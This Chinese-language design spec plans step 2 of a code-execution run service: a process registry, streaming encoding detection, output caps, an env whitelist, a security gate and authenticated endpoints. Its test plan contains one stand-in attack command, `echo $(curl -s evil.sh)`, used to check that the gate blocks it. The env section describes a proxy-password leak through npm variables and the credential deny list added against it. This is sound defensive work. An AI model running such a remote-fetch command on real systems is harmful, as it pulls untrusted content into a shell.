# run 服务步骤 2：runId 注册表 + 片段档策略实例

> 落地 `2026-08-11-code-exec-runner-v4-design.md` §11 的第 2 步。
> v4 的取舍不在这里重复，只写**本步要建的东西**和**实测得出的新约束**。
> 步骤 1（`proc/spawn.ts` 的 `stdin:'ignore'`）已合入 `aa70b93`。
>
> **本文档是 v2。** v1 被独立评审判出 12 条必须改，其中 4 条会直接变成运行期缺陷
> （乱码永久锁死、GBK 跨块乱码、功能不可用、目录逃逸），2 条是**取证造假级**的问题
> （结论是构造保证的同义反复）。改动逐条标在 §0.1。

## 0. 本步交付什么 / 不交付什么

**交付**：一层「跑着的进程」的服务端机制 —— 注册表、生命周期、策略参数、
流式解码、有界输出、安全闸、HTTP 端点。片段档作为它的**第一个策略实例**。

**不交付**（留给步骤 3/4）：任何前端。本步做完，UI 上看不见任何变化 ——
验收靠 HTTP 直接打端点 + 单测，不靠点页面。**这一点要写进 features.md**，
否则用户会去页面上找变化，然后以为没做。

**刻意不做的**：`ProcOutputDecoder` 现有的「收尾整体重解码」路径**不动、不删**。
`bash.ts` 还在用它，一次性语义下它是对的。本步新增的是**另一个**流式解码器，两者并存。
合并留到 bash.ts 也接进 run 服务的那天（步骤 5）。

### 0.1 v1 → v2 改了什么

| v1 的问题 | 改法 | 严重度 |
|---|---|---|
| 「首 4KB 窗结论 == 全量结论 5/5」是同义反复 —— 五条样本总字节全 < 4096，`subarray(0,4096)` 返回的就是整个 buffer | 探针重做，加 >4KB 样本；结论重新取证（§1.1） | **取证造假** |
| 探针把 stdout/stderr 灌进同一个数组，支撑不了 per-stream 决策 | 探针分流统计（§1.1），并据此定案「各自定码」（§3.1） | **取证造假** |
| 没表态 stdout/stderr 是各自定码还是共用一个决策 | 定案：**各自定码**。实测有命令一条 UTF-8 一条 OEM（§1.1 第 6 行） | 运行期缺陷 |
| 窗口切在多字节序列中间会伪造 U+FFFD，把短窗口误判成 OEM 并**永久锁死** | 判定前用 `TextDecoder('utf-8')` 的 stream 模式吃掉挂起尾序列（§3.2） | 运行期缺陷 |
| `new TextDecoder(label, {stream:true})` —— 参数放错位置，被静默忽略 | 改成 `decoder.decode(chunk, {stream:true})`（§3.3） | 运行期缺陷 |
| `POST /api/runs` 让客户端传 `cwd` | cwd 由服务端从 sessionId 反查（§8.1），v4 §0.2 明令 | 目录逃逸 |
| 安全闸做成硬拒，没有「确认后继续」的路径 | 改成可确认（§6.1），并写死闸的是哪个字符串（§6.2） | 功能不可用 |
| 端点表没提 `isAuthed` | 每条路由都写（§8.2） | 漏写约束 |
| kill 没有 deadline，何时发 end / 何时逐出未定义 | §7.3 定义 | 漏写约束 |
| `RunRegistry` 单例 vs 注入未表态 | 定案：**注入**（§2.2） | 漏写约束 |
| 墙钟 300s / 空闲 30min 测试按字面写不是 5 分钟就是假绿 | 时长全部可注入（§7.1） | 漏写约束 |
| 其余建议：探针路径写错、POSIX env 名单缺项、300ms 必须是真定时器、定码后要重放缓冲、ring 无测试、`StreamShaper` 没有「满了」信号、SSE 理由措辞、路由必须插在 SPA 兜底之前、并发上限、会话删除清理 | 逐条已改，见对应小节 | 建议 |

## 0.2 实现进度（每完成一件就在这里打勾，方便隔天接手）

| 模块 | 状态 | 备注 |
|---|---|---|
| `run/stream.ts` StreamDecoder | ✅ 已合 | 13 条测试；两次变异各杀 2/3 条（见下） |
| `run/sink.ts` truncate + ring | ✅ 已合 | 10 条测试（ring 占 5 条）；两次变异各杀 1 条。**§4 有一处改主意，见下** |
| `run/childEnv.ts` runEnv | ✅ 已合 | 14 条；变异证明**对象断言抓不住真实泄露**；含 `npm_config_*` 的凭据 deny 名单 |
| `run/policy.ts` + `run/run.ts` | ✅ 已合 | 21 条；三次变异各杀 4/2/2 条 |
| `run/registry.ts` | ✅ 已合 | 14 条；变异逼出 zombie 的两条淘汰规则 |
| HTTP 端点 | ✅ 已合 | 14 条；变异各杀 1 条（cwd 反查 / isAuthed / 安全闸） |

**独立评审判出 2 条必须改，均已修并各配一条变异验证**：

1. **`npm_config_*` 整组放行会泄代理密码。** 实测（npm 10.9.4，`.npmrc` 放假凭据、
   lifecycle script 倒 env）：`npm_config_proxy` / `npm_config_https_proxy` 明文带着
   `user:password@`。而 daemon 常常就是 `pnpm dev` 起的 —— 这两个变量正躺在它的
   `process.env` 里。已加 deny 名单。（`_authToken` **没有**被摊出来，npm 自己过滤了，
   别把没发生的事写进文档。）
2. **`OEM_MOJIBAKE_RATIO` 在小首窗下退化。** 0.02 是按整份 body 调的；首窗在 300ms
   那档可能只有十几字符，`1/11 = 0.09` 就过线 → 一个偶发坏字节把整条流**永久**锁成乱码。
   实测同一串字节：首窗(11 字符) → OEM 0.0909，全量(2411 字符) → utf8 0.0004。
   判据改成「密度 **且** 至少 2 个 U+FFFD」—— 真 OEM 的坏字符成片（ping 的 92 字节窗有
   24 个），杂散坏字节恰好 1 个。代价：极短且只产生 1 个 FFFD 的真 OEM 命令会解错，
   用几个字符的乱码换掉「整条流永久锁死」，值。

顺带按评审改的：删掉零收益的 `unref()`（实测它在「进程正要退出」那个窄窗口会**静默吞掉**
首窗）；`end()` 后再 `write` 一律丢弃；构造参数改用 `??` 逐项取默认值（显式传 `undefined`
会顶掉默认值，而 `Required<...>` 编译期不报）；`ring` 的 `bytes` 改名 `chars`
（sink 全程按 UTF-16 码元计，中文下 1 字符 ≈ 3 字节，名字对不上会让人把容量调错 3 倍）。

**StreamDecoder 的变异验证记录**（别重做，也别以为它是纸糊的）：

- 变异①：`pickLabel` 里去掉 `{ stream: true }` → 「窗口末尾切断多字节序列不能误判成 OEM」
  与「UTF-8 多字节跨 chunk」**2 条变红**。
- 变异②：把 `stream` 参数挪回 `new TextDecoder(label, {stream:true})`（= spec v1 犯的错）
  → **3 条变红**，含 GBK 跨 chunk 那条。
- 两次都精确还原、与变异前逐字节一致（`diff` 无输出）。

## 1. 实测事实

> 每条都附命令与**完整**输出。探针：`docs/superpowers/specs/probe-run-step2.mjs`
> （跑法：`node docs/superpowers/specs/probe-run-step2.mjs`，仓库根目录下）。

### 1.1 首窗定码

```
$ node docs/superpowers/specs/probe-run-step2.mjs
=== ① 分流统计 + 首窗/全量是否同结论（含 >4KB 样本）===
{"label":"ping -n 2 (OEM,小)","ms":1095,"out":{"firstAt":76,"win":{"bytes":92,"chars":86,"fffd":24,"ratio":0.2791,"verdict":"OEM"},"all":{"bytes":305,"chars":277,"fffd":88,"ratio":0.3177,"verdict":"OEM"},"agree":true},"err":null}
{"label":"ping -n 40 (OEM,>4KB)","ms":39467,"out":{"firstAt":77,"win":{"bytes":92,"chars":86,"fffd":24,"ratio":0.2791,"verdict":"OEM"},"all":{"bytes":2169,"chars":1989,"fffd":468,"ratio":0.2353,"verdict":"OEM"},"agree":true},"err":null}
{"label":"dir /s (OEM,>4KB)","ms":4670,"out":{"firstAt":70,"win":{"bytes":4096,"chars":4096,"fffd":0,"ratio":0,"verdict":"utf8"},"all":{"bytes":34612273,"chars":34612273,"fffd":0,"ratio":0,"verdict":"utf8"},"agree":true},"err":null}
{"label":"git log (UTF8,>4KB)","ms":211,"out":{"firstAt":111,"win":{"bytes":4096,"chars":2274,"fffd":1,"ratio":0.0004,"verdict":"utf8"},"all":{"bytes":33905,"chars":30124,"fffd":0,"ratio":0,"verdict":"utf8"},"agree":true},"err":null}
{"label":"tsc -v (首字节晚到)","ms":1198,"out":{"firstAt":1147,"win":{"bytes":15,"chars":15,"fffd":0,"ratio":0,"verdict":"utf8"},"all":{"bytes":15,"chars":15,"fffd":0,"ratio":0,"verdict":"utf8"},"agree":true},"err":null}
{"label":"stderr OEM + stdout UTF8","ms":183,"out":{"firstAt":130,"win":{"bytes":281,"chars":153,"fffd":0,"ratio":0,"verdict":"utf8"},"all":{"bytes":281,"chars":153,"fffd":0,"ratio":0,"verdict":"utf8"},"agree":true},"err":{"firstAt":176,"win":{"bytes":256,"chars":232,"fffd":78,"ratio":0.3362,"verdict":"OEM"},"all":{"bytes":256,"chars":232,"fffd":78,"ratio":0.3362,"verdict":"OEM"},"agree":true}}
```

四条结论：

1. **首窗结论与全量结论一致（6/6，两条流分开算）。** 这一版不是同义反复了：
   `ping -n 40` 是 92 字节窗 vs 2169 字节全量，`git log -400` 是 4096 字节窗 vs 33905 字节全量。
   v1 那句「5/5 一致」的五条样本总字节是 305/2546/15/1194/10 —— 全部 < 4096，
   窗口 == 全量是 `subarray` 的构造保证，**无论判据对不对都会成立**，是同义反复。

2. **`tsc -v` 的首字节在 1147ms 才到**（三次复跑 1032/1084/1080，v1 记 995）。
   窗口不能从 spawn 起算 —— 那样会在**零字节**上定码。窗口必须是「**首字节到达后**
   ≤300ms 或 ≤4KB」。

3. **一条命令的两条流可以结论相反。** 最后一行：`out` 判 UTF-8（ratio 0），
   `err` 判 OEM（ratio 0.3362）。共用一个决策的话，谁先到谁锁死全局，另一条必然乱码；
   而 stdout/stderr 的到达顺序不确定，症状会随机复现。**据此定案 §3.1「各自定码」。**

4. **4096 字节窗天然稀释截断噪声。** `git log` 那行的窗口里有 **1 个 U+FFFD**
   （4096 边界切断了一个多字节序列），但 ratio 只有 0.0004，远低于阈值 0.02。
   这是触发 (a) 安全的原因；触发 (b) 不安全，见 1.3。

### 1.2 env：传 2 个进去，子进程实得 16 个，且不含凭据

```
=== ② 极小 env：子进程实得多少 ===
传入 2 个，子进程实得 16 个:
BPPDOMAIN_MANAGER_ASM BPPDOMAIN_MANAGER_TYPE COMSPEC HOMEDRIVE HOMEPATH LOGONSERVER PATH PATHEXT PROMPT SYSTEMDRIVE SYSTEMROOT TEMP USERDOMAIN USERNAME USERPROFILE WINDIR
```

证实 v4 §4 的口径：**白名单不是安全边界**（拿不掉这 16 项），
**但它是有效的凭据过滤器**（这 16 项里没有任何 `*_KEY` / `*_TOKEN` / `*_SECRET`）。

**适用范围限定**（v1 漏了）：这 16 项是 libuv 在 **Windows** 上补的。
POSIX 上 `env: {}` 就是真空的，白名单在那边**更接近**真边界 —— 结论「不泄露凭据」
a fortiori 成立，但 §5 的名单必须补上 POSIX 才有的通路变量，否则那边会直接暴露。
本仓确实跨平台：`oem.ts:18`、`spawn.ts:65`、`util.ts:37-45`、`shell.test.ts:116`
都有 `process.platform` 分支。

### 1.3 窗口切断多字节序列会伪造 U+FFFD —— 这条直接决定判据怎么写

```
=== ③ 窗口切断多字节序列会不会伪造 U+FFFD ===
完整 6 字节       {"bytes":6,"chars":2,"fffd":0,"ratio":0,"verdict":"utf8"}
切到 4 字节       {"bytes":4,"chars":2,"fffd":1,"ratio":0.5,"verdict":"OEM"}
60 字切掉末字节   {"bytes":179,"chars":60,"fffd":1,"ratio":0.0167,"verdict":"utf8"}
切4字节+stream判  {"chars":1,"fffd":0,"verdict":"utf8(不产生 FFFD)"}
```

判据是 `fffd/chars ≥ 0.02`，即 **任何解码后 ≤50 字符的窗口，只要末尾切在多字节序列中间，
就翻成 OEM**。而 §3 又规定定码后「永不回头」—— 一次误判 = 整个 run 的输出全成乱码。

三个触发的风险**不对称**：

| 触发 | 窗口大小 | 截断噪声 | 安全吗 |
|---|---|---|---|
| (a) 攒够 4096 字节 | 4096 | 稀释到 0.0004（1.1 第 4 条实测） | 安全 |
| (c) 进程退出 | 全部字节 | 不存在截断 | 安全 |
| **(b) 首字节后 300ms** | **由 chunk 到达决定，可以只有十几字节** | **1/N，N≤50 时必翻** | **危险** |

本探针自己的样本里 `tsc -v` 总共 15 字节、`echo` 10 字节，都远在 50 字符线以下。

**解法**（末行实测）：判定前用 `TextDecoder('utf-8')` 的 **stream 模式**解窗口 ——
它把挂起的尾序列留在内部、不产出 U+FFFD，于是切断噪声归零。

### 1.4 `TextDecoder` 的 stream 参数放在哪

```
=== ④ TextDecoder 的 stream 参数该放哪（GBK 双字节跨 chunk）===
A 构造函数传 stream: "你�檬澜�"   ← 错，参数被静默忽略
B decode 传 stream : "你好世界"   ← 对
```

v1 写的是 A（`new TextDecoder(label, {stream:true})`）。构造函数只吃 `{fatal, ignoreBOM}`，
`stream` 被静默忽略，于是每次 `decode()` 都当一次完整刷新 ——
**GBK 双字节跨 chunk 断开时正好乱码，也就是那条「补充」自称要消灭的 bug**。

`Buffer.isEncoding('gbk') === false`，所以确实不能 `toString`，补充的**意图**是对的，
只有写法错。`oem.ts:37` 已有 `try { new TextDecoder(label) } catch { return null }` 兜底，
ICU 不支持某标签时会退回 UTF-8，不是新风险。

## 2. 模块落点

```
packages/tools/src/run/
  run.ts          单个 run 的生命周期状态机 + 订阅者集合（可脱离 HTTP 单测）
  registry.ts     RunRegistry：map + 逐出 + 并发上限
  policy.ts       RunPolicy 类型 + 片段档实例
  stream.ts       StreamDecoder：首窗定码 + 粘滞（§3）
  sink.ts         输出汇：truncate 档 / ring 档（§4）
  childEnv.ts     runEnv()：白名单 + runner 声明变量（§5）
```

`run.ts` 与 `registry.ts` **必须分开**（v1 只有 registry）：否则 registry 要同时承担
runId 生成、spawn 接线、墙钟、空闲、kill deadline、sink、decoder、逐出、
**以及 SSE 订阅者扇出** —— 最后一项在 v1 的五文件里根本没有落点。

文件名用 `childEnv.ts` 而**不是** `env.ts`：与 `proc/env.ts` 同名不会出错，
但 `proc/index.ts:17` 的注释专门写了本仓 barrel 撞过 TS2308，`run/index.ts`
若图省事写 `export *` 就正好踩回去。**`run/index.ts` 一律具名转出。**

### 2.1 为什么放 `@zuse/tools`

`@zouyj/zuse-server` 依赖 `@zuse/tools`（package.json:48），反过来不行；
而 v4 §11 步骤 5 要把 run 服务**同时暴露成模型工具**，工具住在 tools 里。
放 server 就得在步骤 5 整个搬家。

新开 `run/` 而不塞进 `proc/`：`proc/` 的语义是「跑一条命令、把输出收上来」
（它自己的文件头注释），一次性、无身份；run 是「长跑、有 id、可重连、有策略」。
生命周期模型不同，混在一起后来人分不清该用哪个。`run/` 依赖 `proc/`。

### 2.2 `RunRegistry` 必须**注入**，不能模块级单例

两条证据：

1. **服务端现有约定全是注入**：`makeRequestHandler(deps)`（server.ts:187）、
   `attachWsServer(httpServer, deps)`（wsServer.ts:30），没有一处模块级服务单例。
2. **模块级单例在本仓已经咬过人。** `Shell.tsx:89` 原话：
   「`activePreview` 是模块级单例，**在此之前没有任何人在切会话时清它**」——
   为收拾残局 `ActiveRun` 被迫加 `sessionId` 字段，Shell 还得配一条
   `useEffect(() => { closeRun() }, [currentSessionId])`。

服务端单例还多一层代价：同一个 vitest worker 里的用例会共享注册表状态，
**而且会把真子进程漏给下一个用例**。

**做法**：`startServer` 里 `new RunRegistry(opts)` 一次，经 deps 传下去。

## 3. 流式解码

### 3.1 每条流各自定码

stdout 与 stderr **各持一个 `StreamDecoder`**，各自独立定码。

依据是 §1.1 第 3 条：实测有命令 `out` 判 UTF-8、`err` 判 OEM。共用一个决策时，
谁的首窗先满谁锁死全局 —— 而到达顺序不确定，症状随机复现。

现有 `ProcOutputDecoder` 是**混合的**（per-stream 的 `StringDecoder`，但共享
`rawChunks` 和**一个** OEM 决策，output.ts:30/45/52/70）。它是一次性语义、
收尾时对合并 body 判一次，在那个语义下没问题；**流式不能照抄**。

某条流一个字节都没有 → 该流不需要决策，也不产出任何事件。

### 3.2 状态机

```
状态：'buffering' → 'utf8' | 'oem'

buffering：原始 chunk 攒着，一个字符都不吐
定码触发（先到者胜）：
  a. 攒够 4096 字节
  b. **首字节到达时 setTimeout(300)** 到点           ← §1.1 第 2 条：起点是首字节不是 spawn
  c. 进程退出（不足一窗也得定）
定码判据：
  用 TextDecoder('utf-8') 的 **stream 模式**解窗口   ← §1.3：不这样会把 ≤50 字符窗误判成 OEM
  U+FFFD 密度 ≥ 0.02 → oem，否则 utf8
  （0.02 沿用 oem.ts 的 OEM_MOJIBAKE_RATIO，判据同源，不另立门户）
定码后：
  1. 把攒下的原始 chunk 用选定解码器**重放**吐出     ← v1 漏写
  2. clearTimeout
  3. 整条流锁死该编码，永不回头
```

**(b) 必须是真 `setTimeout`，不能是「下一个 chunk 到达时算 elapsed」。**
后者遇到「吐一个字节然后沉默」（banner 之后等输入的 REPL、慢构建的第一行日志）
会**永远卡在 buffering，一个字都不吐**。

**零字节退出**：走 (c)，空窗判 UTF-8，没有字节要吐，无害。

### 3.3 定码之后怎么解

```ts
const dec = new TextDecoder(label)          // label: 'utf-8' | winOemLabel()
dec.decode(chunk, { stream: true })         // ← stream 是 decode 的参数，不是构造函数的
```

依据 §1.4 实测。放构造函数里会被静默忽略，GBK 双字节跨 chunk 断开时乱码。

### 3.4 代价（明写）

- 首字节最多晚 300ms 到前端。人读输出的场景下不可感知。
- 一条流内混编码时按窗口的主导方解全流。与 `oem.ts` 现有注释里已认的
  「混合编码按主导方解」**同级**，不是本步新欠的债。
- 首窗判据只看了 6 条命令。设了 `FORCE_COLOR`、或输出前 4KB 恰好是纯 ASCII 而
  后面才出中文的命令（如先打 banner 再打中文日志），仍可能判错。
  **缓解**：§5 对我们控制得了的语言强制 UTF-8（`PYTHONIOENCODING` / `JAVA_TOOL_OPTIONS`），
  把 OEM 路径降级成原生控制台程序的兜底。

## 4. 输出汇（两档策略）

| | truncate 档（片段档） | ring 档（项目档，本步只建不接） |
|---|---|---|
| 满了怎么办 | 停止收集 + **杀进程**，reason=`output-cap` | 丢最旧的，进程不动 |
| 预算 | `StreamShaper` + **调用方自己数字节** | 环形字节缓冲 |
| 语义 | 「这条命令输出太多，已停止」 | 「只保留最近 N KB」 |

> **实现时改主意了（2026-08-11，已落地）**：本节原写「truncate 档 = `StreamShaper` +
> 调用方自己数字节」。真读完 `truncate.ts` 之后放弃复用 —— `StreamShaper` 是为
> 「一次性 `finalize()` + 落盘」造的，head/tail 都是 private，**没有中途取快照的能力**，
> 而 run 服务恰恰要给中途接入的 SSE 订阅者补历史。硬套它要么把它改造成两用、
> 要么在它外面再挂一份缓冲，两条都比几十行的有界缓冲贵。
> **代价：`run/sink.ts` 不落盘。** 片段档预算内的输出内存里放得下；项目档要落盘是步骤 4
> 的事，届时再决定复用 `StreamShaper` 还是给 ring 加 spill。
> 另外定了一条 v2 没写的语义：**`overflowed` 的意思是「该杀进程了」，不是「缓冲区满了」**，
> 所以 ring 档恒 false —— 它天天在丢字符，若也举旗，调用方会去杀一个跑得好好的 dev server。

**`StreamShaper` 没有「满了」这个信号**（v1 说「直接用不重写」，不准确）：
它是 head 定长 + tail 环形 + 落盘，永远不停、永远不报警；`totalChars` 是 private
（truncate.ts:106，无 getter），`append()` 返回 `void`，只有 `finalize()` 才吐 `truncated`。
所以 truncate 档的「满了就杀」触发点得**调用方自己累计字节数**。不改 `StreamShaper`
（它自带测试、bash.ts 在用），只在 sink 里多一个计数器。

**ring 档建了但不接线**是明知故犯的死代码。值得建的理由**不是** v1 写的那个
（`RunPolicy.sink` 做成判别联合本来就能拿到「接口按两档形状长」的收益，代价为零），
而是：**它是一个纯模块，可以脱离注册表独立单测**。因此 §10 **必须有 ring 的单测** ——
否则就成了「建了、不接线、也不测」的真死代码，会在步骤 4 之前静默腐坏。

## 5. env

```ts
runEnv(base: NodeJS.ProcessEnv, declared: Record<string, string>): NodeJS.ProcessEnv
```

从 `base` 按名单挑，再叠加 runner 声明的变量。

- **通路类**（砍掉会「起不来」）：
  - 两平台：`PATH` `HOME` `TEMP` `TMP` `LANG` `LC_ALL` `LC_CTYPE` `TZ`
  - Windows：`PATHEXT` `COMSPEC` `SYSTEMROOT` `SYSTEMDRIVE` `WINDIR` `HOMEDRIVE` `HOMEPATH` `USERPROFILE` `USERNAME` `USERDOMAIN`
  - POSIX（v1 漏了整组，Windows 上被那 16 项兜底掩盖）：
    `USER` `LOGNAME` `SHELL` `LD_LIBRARY_PATH` `SSL_CERT_FILE` `SSL_CERT_DIR` `XDG_CACHE_HOME`
- **语义敏感类**（砍掉不会崩，会**结果悄悄不一样** —— 比崩了更难查）：
  `JAVA_HOME` `GRADLE_USER_HOME` `MAVEN_OPTS` `M2_HOME` `NODE_OPTIONS`
  `PYTHONPATH` `VIRTUAL_ENV` `CONDA_PREFIX`，以及**全部 `npm_config_*` 前缀**
- **runner 自己声明的**：`PYTHONUNBUFFERED=1` `PYTHONIOENCODING=utf-8`
  `JAVA_TOOL_OPTIONS=-Dfile.encoding=UTF-8`（按语言注入，不无脑全给）
- **强制摘掉**：`_VOLTA_TOOL_RECURSION`（沿用 `proc/env.ts` 的理由）

`JAVA_HOME` 单列的理由（v4 §4 已记）：本机它与 PATH 上的 JDK 恰好同一个，砍掉**看不出差别**；
用户两者不同时会静默换一个 JDK 编译。这类「本机测不出来」的项最该写进名单。

**测试断言必须打子进程的真实环境**（`set` / `env` 的输出），不是 JS 对象 ——
v4 §12 点名这条，对象断言是纸糊的。**并做变异验证**：把断言改回对象断言，
确认它抓不住真实泄露。

## 6. 安全闸

### 6.1 可确认，不是硬拒

起 run 前调 `hasBlockingBashSecurityIssue(command)`（`core/bash-security.ts:422`，
返回 `BashSecurityHit | null`，含 `checkId/name/severity/reason`）。

命中 → **409 + `securityHit`**，前端把 `reason` 显示在确认框里；
用户确认后**带 `confirmed: true` 重发**，此时放行。

v1 做成硬拒是**偏离 v4 §5**，而且方向反了：`$(...)` 是
`checkId:8 command-substitution severity:'block'`（bash-security.ts:233-236），
于是用户在自己写的代码里点运行 `echo "构建于 $(date)"` → 永久跑不了；
而模型走 Bash 工具时同一条命令 `decide()` 返回 `{decision:'ask'}`（permission.ts:357）
—— **点一下就能跑**。用户对自己写的代码比模型受限更严，说不通。

「不做同意缓存」与「能不能确认」是**正交**的，v1 把前者当成后者的理由，推错了。
本步仍**不做**同意缓存（v4 §9 的 `hash(cwd+'\0'+command)` 属于步骤 4 的项目档输入框）。

### 6.2 闸的是哪个字符串 —— 写死

**本步 `POST /api/runs` 只接受 `command` 字符串一种形态**，安全闸检查的就是它。

不接受「脚本正文 + wrapper」形态。理由：若实现成「正文写临时文件 + 跑 `uv run x.py`」，
送进闸门的是那条 wrapper，**几乎永不命中** —— 那正是 v4 §5 批评 v3 的空表形状，
而真正能干任何事的脚本正文完全未检查。

片段档的「把代码块内容变成可跑的东西」属于 **runner**，落在步骤 3。
届时**必须把脚本正文也送进闸门**，这条约束现在就写下来，别到时候忘了。

## 7. 生命周期与策略

### 7.1 策略参数（时长全部可注入）

```ts
interface RunPolicy {
  wallClockMs: number | null   // 片段档 300_000；项目档 null
  idleMs: number | null        // 片段档 null；项目档 30 * 60_000（v4 §3）
  killGraceMs: number          // SIGTERM 到 SIGKILL 的宽限，默认 3_000（§7.3）
  onDetach: 'kill' | 'keep'    // 片段档 kill；项目档 keep
  sink: { kind: 'truncate'; budget: number } | { kind: 'ring'; bytes: number }
}
```

**时长必须能注入**，否则 §10 的「墙钟 300s 到点被杀」按字面写就是一个 **5 分钟**的测试，
「空闲 30 分钟」更没法测。测试用 200ms 那一档。

### 7.2 空闲判据

重置计时器的判据是**有字节到达**，不是有可见文本到达。

理由不是 v1 写的「buffering 阶段吐不出文本」（那只覆盖前 300ms，撑不起一个 30 分钟的计时器），
而是 **v4 §3 的实测判据本身就是字节级的**：「死循环有输出 6000ms 后仍活着，空闲仅 44ms」。
按「可见文本」判会误杀只吐 `\r` 进度条的构建。

### 7.3 kill 的兑现（v1 完全没写）

现有 `killTree`（`tools/src/util.ts:35-46`）是彻底的 fire-and-forget：Windows 上
`spawn('taskkill', …)` 不等结果，POSIX 上只发 `SIGTERM`，**没有 SIGKILL 升级、
不验证进程死没死**。

所以本步定义：

```
kill(reason):
  1. 标记 status='killing'，记 reason
  2. killTree(pid)                    （SIGTERM / taskkill）
  3. setTimeout(killGraceMs) → 仍未收到 'exit' → 二次 killTree，POSIX 升级 SIGKILL
  4. 逐出**只在收到 'exit' 事件时**发生；到点仍未死 → 状态转 'zombie'，
     保留在注册表里并在 GET /api/runs 里标出来
```

**逐出绝不能发生在「调 kill 那一刻」**：那会把条目删掉、进程留活，谁也再杀不了它 ——
v4 §2 说的「只有杀 daemon 才能收」原样复发。

`end` 事件在收到 `'exit'`（或转 `zombie`）时发，携带结构化 `reason`：
`'exit' | 'wall-clock' | 'idle' | 'killed' | 'detach' | 'output-cap' | 'zombie'`。
**必须是枚举不是自由文本** —— v4 §3 要求「因 30 分钟无输出被停止」这句话出现在 UI 上，
UI 要能按原因给不同文案。

### 7.4 并发上限与清场

- **并发上限**：默认 8 个在飞 run，超了 `POST /api/runs` 返回 429。
  v4 §2 提到「永久占住一个并发额度」却没定义额度，这里补上。
- **会话删除**：`DELETE /api/sessions/:id`（server.ts:339）时杀掉属于该会话的 run。
  不做的话删了会话它的 run 成孤儿。
- **daemon 关停**：注册表提供 `closeAll()`，接进现有的进程退出清场路径
  （ws 侧有 `wsServer.ts:79-84` 的同类物，照它接）。

## 8. HTTP 端点

### 8.1 形状

```
POST   /api/runs            body: {command, sessionId, kind?, confirmed?}
                            **不接受 cwd** —— 服务端从 sessionId 反查（v4 §0.2 明令：
                            「cwd 只能服务端从 sessionId 反查」）。客户端传 cwd
                            = 任意命令 + 任意目录 = 目录逃逸。
                            → 201 {runId}
                            → 409 {error, securityHit}   （见 §6.1，带 confirmed 重发可放行）
                            → 429 {error}                （并发上限，§7.4）
GET    /api/runs/:id/stream SSE：{type:'chunk',stream:'out'|'err',text}
                                 {type:'end',reason,exitCode}
DELETE /api/runs/:id        kill + 按 §7.3 逐出
GET    /api/runs            在飞列表（v4 §7 要的「重连入口」的数据源）
```

### 8.2 鉴权与路由顺序（v1 都漏了）

- **每条路由都要 `if (!isAuthed(req)) return sendJson(res, 401, …)`**。
  server.ts 里每条 `/api/*` 都有（304/312/339/374/432/489/…），v4 §0.2 把
  「逐路由 `isAuthed`」列为要保留的一条。**一个执行任意命令的端点不写鉴权，
  是最不该省的那一行。**
- **`GET /api/runs` 与 `GET /api/runs/:id/stream` 必须插在 `server.ts:998`
  那条 SPA 兜底（`if (method === 'GET') { … index.html … }`）之前**，
  否则会静默返回 **index.html + 200**，不是 404，更难查。

### 8.3 为什么 SSE 而不复用现有 WebSocket

准确的理由（v1 措辞不准）：

- 现有 ws 是 **per-session** 的：`wsServer.ts:36` 只认 `/ws`、`:48` 从 query 取
  `sessionId`、`:73` 把 socket 绑死在一个 SessionManager 上。run 不属于任何会话时
  没有归属连接可用。
- 切会话时 socket 是**真的关掉重开**的（`store.tsx:161` 调 `reconnect()`，
  `ws/client.ts:36` 里 `ws.close()`）。走 ws 则输出投递会断、重连后还要补历史；
  且若把 `onDetach` 绑在连接关闭上就会**误杀**。
  （注意：ws 关闭本身**不会**杀 run —— run 活在服务端注册表里。v1 说
  「两个生命周期互相牵连」表述不准。）

**鉴权能过**：`server.ts:210` `sameSite:'Lax'` + 逐路由 `isAuthed` 校验 cookie。
同源 `EventSource` 带 cookie；跨站 EventSource 在 Lax 下不带 → 401。
本仓没有独立 CSRF token 机制，SameSite=Lax 就是防线，`POST /api/runs` 与现有所有 POST 同级。

**代价**：多一个连接；HTTP/1.1 下每域名 6 连接上限意味着同时看 6 个以上 run 会排队。
本步只有片段档、同时最多 1 个，不构成问题。
**本仓没有服务端 SSE 先例**（`grep text/event-stream` 只命中 `core/mcp-transport.ts:285`，
那是客户端消费），分帧、心跳、`res.flushHeaders()` 都得自己写，测试成本见 §10。

## 9. 已知代价（汇总，不留白）

1. **模型看不到运行输出**（v4 §10 的取舍，本步继承）。步骤 5 才解。
2. 本步做完**页面上看不到任何变化**，验收靠打端点。
3. 首字节最多晚 300ms。
4. 一条流内混编码按主导方解；首 4KB 全 ASCII、之后才出中文的命令仍可能判错（§3.4）。
5. ring 档建了但不接线，步骤 4 之前是死代码 —— 明知故犯，但**有单测**（§4）。
6. SSE 连接数上限（§8.3）；且本仓无服务端 SSE 先例，要自己搭分帧与测试。
7. **本步吐的 `text` 未做 CRLF 归一化** —— v4 §8 要求「先归一化 `\r\n` 再处理裸 `\r`」，
   那是步骤 3 终端输出区的事。前端若直接把本步的 `text` 当终端渲染，`\r` 会吃掉行。
8. 安全闸只检查 `command` 字符串；步骤 3 引入脚本正文时**必须**把正文也送进闸门（§6.2）。

## 10. 测试要点

**起真子进程不需要 `describe.skipIf`。** 本仓的分工是：`skipIf` 只用于**环境依赖**
（`permission.test.ts:317` 路径分隔符、`anthropic-client.test.ts:199` 要真打 API、
`lsp/integration.test.ts:56` 要装 LSP server、`shell.test.ts:73/116` 平台分支）；
而起真子进程的 `spawn.test.ts` 是**无条件跑**的，靠 15000ms 的 it 超时（:79/:96）、
`getShellLabel()` 分 shell 加引号（:41-43，注释明写不这么做会在 pwsh 机器上假绿）、
`afterAll` 删临时目录（:11-15）稳住。照这个路子走。

- **首窗（喂假字节源，不真跑 `npx tsc`）**：首字节晚到 1s 的形状不能在空缓冲上定码
- 首窗：OEM 与 UTF-8 各一条，窗口结论与全量结论一致
- **首窗：≤50 字符窗口末尾切断多字节序列，不能翻成 OEM**（§1.3，这是变异测试的重点）
- **两条流各自定码**：喂 out=UTF-8 / err=OEM，断言两边都对（§1.1 第 3 条的形状）
- **GBK 双字节跨 chunk 断开仍不乱码**（§1.4）
- 「吐一个字节然后沉默」的进程，300ms 后必须吐字（§3.2 的真定时器）
- env：断言**子进程真实环境**；变异验证「改回对象断言就抓不住」
- 安全闸：`echo $(curl -s evil.sh)` 返回 409 + `reason`；**带 `confirmed:true` 重发能起**
- 墙钟 / 空闲：**用注入的 200ms 档**，不是 300s / 30min
- kill deadline：不响应 SIGTERM 的进程，`killGraceMs` 后升级；逐出只在 `exit` 时
- 并发上限：第 9 个返回 429
- ring 汇：单测（满了丢最旧、不杀进程）
- **HTTP 层**：401 未鉴权、409 带 `securityHit`、SSE 分帧能被解析、
  `GET /api/runs` 不被 SPA 兜底吃掉（返回 JSON 不是 index.html）
